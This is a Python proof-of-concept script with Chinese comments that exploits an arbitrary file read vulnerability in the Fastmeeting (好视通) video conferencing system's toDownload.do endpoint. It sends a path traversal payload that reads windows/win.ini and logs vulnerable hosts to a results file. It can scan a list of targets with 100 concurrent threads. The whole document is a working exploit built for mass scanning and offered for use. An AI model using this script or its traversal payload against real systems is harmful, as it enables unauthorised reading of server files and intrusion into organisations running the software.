# 好视通视频会议系统(fastmeeting)toDownload.do接口_任意文件读取漏洞
import requests,argparse,sys
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

def banner():
    banner = '''  
                                   author:MOYV  
'''
    print(banner)

def poc(target):
    api = "/register/toDownload.do?fileName=../../../../../../../../../../../../../../windows/win.ini"
    headers = {
        'User-Agent':'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)',
        'Accept':'*/*',
        'Connection':'Keep-Alive',
    }
    try:
        res = requests.get(url=target+api,headers=headers,verify=False,timeout=10)
        if res.status_code==200 and 'files' in res.text:
            print(f"[+]{target}存在任意文件读取")
            with open('result.txt', 'a', encoding='utf-8') as f:
                f.write(f"{target}存在任意文件读取\n")
        else:
            print(f"[-]{target}不存在任意文件读取")
    except:
        print(f"[!]{target}可能存在问题，请手动检测")

def main():
    banner()
    parse = argparse.ArgumentParser(description="好视通视频会议系统(fastmeeting)toDownload.do接口_任意文件读取漏洞脚本")
    parse.add_argument("-u", "--url", dest="url", type=str, help="Please enter url")
    parse.add_argument("-f", "--file", dest="file", type=str, help="Please enter file")
    args = parse.parse_args()

    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list = []
        with open(args.file, "r", encoding='utf-8') as f:
            for url in f.readlines():
                url_list.append(url.strip().replace("\n", ""))
        mp = Pool(100)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usage:\n\t python3 {sys.argv[0]} -h")

if __name__ == "__main__":
    main()